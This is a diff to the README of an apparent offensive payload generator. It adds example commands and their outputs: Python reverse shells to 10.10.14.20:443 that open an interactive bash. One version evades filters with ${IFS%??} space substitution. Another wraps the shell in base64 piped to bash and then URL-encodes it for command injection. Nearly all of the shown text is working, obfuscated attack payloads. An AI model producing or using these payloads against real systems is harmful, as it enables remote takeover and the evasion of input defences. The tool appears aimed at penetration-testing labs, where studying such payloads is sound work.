@@ -41,7 +41,13 @@ python3 Omni-Payload-Generator.py -y 10.10.14.20 443 -ifs ssti -e  # Python reve
 **Example: Generating a Python3 Shell with IFS Manipulation**
 ```bash
 Command: python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection
-Output: python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.run(["/bin/bash","-i"]);'
+Output: python3${IFS%??}-c${IFS%??}'import${IFS%??}socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0);${IFS%??}os.dup2(s.fileno(),1);${IFS%??}os.dup2(s.fileno(),2);subprocess.run(["/bin/bash","-i"]);'
+```
+
+**Example: Generating a Python3 Shell with IFS Manipulation via echoed base64 bashed method wrapped within url encoding**
+```bash
+Command: python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection -e -b64
+Output: bash%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D%27echo%24%7BIFS%25%3F%3F%7D%22cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MucnVuKFsiL2Jpbi9iYXNoIiwiLWkiXSk7Jw==%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%27
 ```
 
 ### **7. Screenshots or Diagrams**
